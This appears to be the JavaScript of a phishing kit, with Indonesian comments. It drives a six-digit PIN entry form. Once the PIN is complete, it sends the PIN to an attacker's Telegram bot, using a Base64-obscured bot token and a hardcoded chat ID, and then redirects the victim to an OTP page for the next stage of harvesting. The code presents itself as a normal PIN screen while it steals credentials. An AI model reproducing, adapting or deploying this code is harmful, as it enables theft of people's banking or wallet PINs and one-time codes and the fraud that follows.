document.addEventListener("DOMContentLoaded", function () {
    const pins = document.querySelectorAll(".pin-input"); // Ambil semua input PIN

    pins.forEach((input, index) => {
        input.addEventListener("input", function () {
            // Hanya angka yang diterima
            this.value = this.value.replace(/\D/g, '');

            // Pindahkan fokus ke input berikutnya jika terisi
            if (this.value.length === 1 && index < pins.length - 1) {
                pins[index + 1].focus();
            }

            // Jika semua input terisi, kirim ke Telegram dan pindah ke halaman OTP
            if (index === pins.length - 1 && this.value.length === 1) {
                submitPin();
            }
        });

        input.addEventListener("keydown", function (e) {
            // Pindah fokus ke input sebelumnya jika tombol backspace ditekan dan input kosong
            if (e.key === "Backspace" && this.value === "" && index > 0) {
                pins[index - 1].focus();
            }
        });
    });
});

// Fungsi untuk mengirim PIN ke bot Telegram
function submitPin() {
    const pin = Array.from(document.querySelectorAll(".pin-input"))
        .map(input => input.value)
        .join('');

    if (pin.length === 6) { // Pastikan PIN terdiri dari 6 digit
        const botToken = atob('NzU2OTI2ODM2MDpBQUdlQmR4Q0dTM0tVcDd1c094VDJnU2tIUVZHUGRmWUJkVQ'); // Gunakan Base64
        const chatId = '7732620750'; // Ganti dengan chat ID yang benar
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=PIN: ${pin}`;

        fetch(url)
            .then(response => {
                if (response.ok) {
                    // Setelah berhasil mengirim PIN, arahkan ke halaman OTP
                    setTimeout(() => {
                        window.location.href = 'otp.html'; // Arahkan ke halaman OTP
                    }, 500);
                } else {
                    alert('Gagal mengirim PIN');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }
}